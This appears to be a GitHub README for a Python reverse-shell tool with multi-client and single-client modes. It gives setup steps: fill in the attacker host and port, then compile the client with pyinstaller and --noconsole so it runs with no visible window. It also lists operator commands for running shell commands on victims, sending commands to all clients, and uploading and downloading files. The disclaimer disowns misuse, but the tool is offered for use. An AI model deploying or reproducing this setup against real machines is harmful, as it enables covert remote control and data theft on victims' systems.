# Reverse-Shell-In-Python
A Multi Client And Singular Client Reverse Shell Made In Python

## ⚠️ I AM NOT RESPONSIBLE FOR ANY MISUSE OF THIS TOOL USE AT YOUR OWN RISK

## Setup

1. Edit Host And Client


client.py
```Python
host = "YOUR HOST"
port = "YOUR PORT"
```
server.py
```Python
host = "YOUR HOST"
port = "YOUR PORT"
```

2. Compile Client

```
pip install pyinstaller

pyinstaller --onefile --noconsole --icon=NONE client.py
```

## Multi Client Commands
```
-------------------Commands------------------------
list               Lists All The Connected Clients
connect <NUMBER>   Connect To a Client Shell
sendall <COMMAND>  Sends All Clients A Command
exit               Exits Server And Kills Clients
```

## Singular Client Commands
```
Commands
---------------------
All System Shell Commands
upload <FILE>
download <FILE>
clear
quit
```
